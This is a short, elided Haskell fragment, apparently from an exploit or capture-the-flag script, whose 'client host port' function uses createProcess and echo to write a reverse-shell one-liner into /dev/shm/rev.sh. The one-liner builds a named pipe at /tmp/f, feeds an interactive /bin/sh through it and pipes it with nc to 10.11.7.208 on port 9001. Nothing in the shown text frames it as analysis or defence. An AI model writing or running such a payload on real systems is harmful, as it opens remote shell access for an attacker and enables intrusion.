...
client host port = withSocketsDo $ do
                ...
                (_, Just hout, _, _) <- createProcess (proc "echo" ["'/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.7.208 9001 >/tmp/f' > /dev/shm/rev.sh"]) {std_out = CreatePipe}
